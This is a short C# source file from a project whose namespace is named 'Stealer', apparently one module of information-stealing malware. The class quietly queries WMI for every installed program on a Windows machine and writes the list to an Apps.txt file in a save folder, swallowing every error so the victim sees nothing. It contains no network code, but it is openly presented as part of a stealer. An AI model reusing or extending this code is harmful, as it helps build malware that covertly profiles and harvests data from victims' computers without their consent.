using System.Management;

namespace Stealer
{
    internal sealed class InstalledApps
    {
        // Get installed applications
        public static void WriteAppsList(string sSavePath)
        {
            try
            {
                ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_Product");
                foreach (ManagementObject mo in mos.Get())
                {
                    System.IO.File.AppendAllText(
                        sSavePath + "\\Apps.txt",
                        mo["Name"].ToString() + "\n");
                }
            } catch { }
        }
    }
}
